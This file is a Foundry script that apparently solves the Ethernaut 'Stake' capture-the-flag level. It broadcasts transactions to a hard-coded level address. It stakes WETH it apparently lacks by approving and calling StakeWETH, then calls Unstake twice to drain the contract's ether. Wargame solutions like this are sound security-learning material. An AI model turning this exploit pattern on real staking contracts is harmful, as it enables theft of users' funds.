// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Stake} from "../../src/Ethernaut/Stake.sol";
import {Helper} from "../../test/Ethernaut/Stake.t.sol";
import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Stake stake = Stake(0x42d0a8D6D32E8962B2b1EA5A1baD458201616aA1);
        Helper helper = new Helper();
        helper.stake{value: 0.002 ether}(stake);
        IERC20 weth = IERC20(stake.WETH());
        weth.approve(address(stake), 10 ether);
        stake.StakeWETH(10 ether);
        stake.Unstake(0.001 ether);
        stake.Unstake(9.999 ether);
        vm.stopBroadcast();
    }
}
